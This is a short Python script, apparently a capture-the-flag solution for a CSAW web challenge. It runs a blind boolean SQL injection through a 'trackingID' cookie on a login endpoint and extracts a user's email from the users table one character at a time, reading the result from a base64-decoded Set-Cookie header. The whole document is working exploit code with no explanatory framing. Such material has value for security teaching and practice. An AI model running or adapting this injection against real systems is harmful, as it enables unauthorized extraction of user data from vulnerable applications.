#sqlinjection
```
import requests
import base64
import string


charset="@"+"."+string.ascii_lowercase+string.ascii_uppercase+string.digits

print(charset)


url="http://web.csaw.io:5800/login"
found = ""


n=1
for x in range(30):
    for i in charset:
        headers={"Cookie":"trackingID=' or substring((select email from users limit 1,1),"+str(n)+",1)=\""+i+"\"-- -;"}
        r=requests.post(url,headers=headers)
        cook=r.headers["Set-Cookie"][8:].split(".")[0]
        length_without_padding = len(cook)
        padding_needed = (4 - (length_without_padding % 4)) % 4
        cook = cook+ "=" * padding_needed
        decoded=base64.b64decode(cook).decode()
        print("trying:",i)
        if "Error" not in decoded:
            found = found+i
            print("found:",found)
            break
    n=n+1
```
